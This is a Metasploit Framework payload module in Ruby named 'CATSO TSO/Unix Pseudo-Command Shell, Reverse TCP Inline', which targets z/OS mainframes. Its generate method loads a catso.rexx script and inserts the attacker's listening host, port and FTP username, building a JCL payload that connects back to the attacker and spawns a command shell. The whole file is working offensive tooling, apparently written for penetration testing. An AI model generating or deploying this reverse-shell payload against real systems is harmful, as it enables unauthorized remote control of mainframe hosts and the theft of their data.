##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'CATSO TSO/Unix Pseudo-Command Shell, Reverse TCP Inline',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'Soldier of Fortran & S_0xBA115',
			'License'       => MSF_LICENSE,
			'Platform'      => 'zos',
			'Arch'          => ARCH_ZARCH,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
			'Payload'       =>
			{
			  'Compat'      =>
        {
          'PayloadType'    => 'cmd_interact',
          'ConnectionType' => 'find'
        },
        'Offsets' => { },
    		'Payload' => ''
      }
   ))
  end

  ##
  #Use the Catso REXX file to create a dynamic JCL script payload
  ##
  def generate
    #Reads in the "catso.rexx" file, stored in the data folder, as a string
    file = File.join(Msf::Config.data_directory, "rexx", "catso.rexx")
    tso = File.open(file, "rb"){|f|
      f.read(f.stat.size)
    }
    
    #Replace default values for jobname, username and local host info with datastore values
    tso.gsub!("127.0.0.1", datastore['LHOST'].to_s) if datastore['LHOST']
    tso.gsub!("4444", datastore['LPORT'].to_s) if datastore['LPORT']
    if datastore['FTPUSER']
      tso.gsub!("JOBNAME", datastore['FTPUSER'].upcase + Rex::Text.rand_text_alpha_upper(1))
      tso.gsub!("USERNAME", datastore['FTPUSER'].upcase)
    end
    
    ##
    #Return the normalized JCL script containing the CaTSO REXX exploit data file
    ##
    return super + tso
  end

end
